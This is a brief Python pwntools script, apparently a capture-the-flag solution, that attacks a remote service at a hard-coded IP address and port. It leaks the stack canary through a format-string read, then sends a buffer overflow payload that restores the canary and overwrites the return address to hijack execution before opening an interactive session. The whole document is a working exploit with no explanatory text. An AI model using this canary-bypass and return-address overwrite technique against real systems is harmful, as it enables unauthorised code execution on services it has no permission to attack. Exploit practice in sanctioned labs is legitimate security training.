from pwn import *

context.log_level = 'debug'
io = remote("139.162.5.230", "10096")

offset = 264
canary_at = 47

io.sendlineafter(b":","%{}$p".format(canary_at).encode())
junk = io.recvuntil(b":")
canary = int(io.recvuntil(b'\n').decode().strip(),16)
info('Canary = 0x%x (%d)', canary, canary)

payload = flat([
    offset * b'A',  
    p64(canary),
    8* b'B',
    p64(0x40121d)
])

io.sendlineafter(b':', payload)
io.interactive()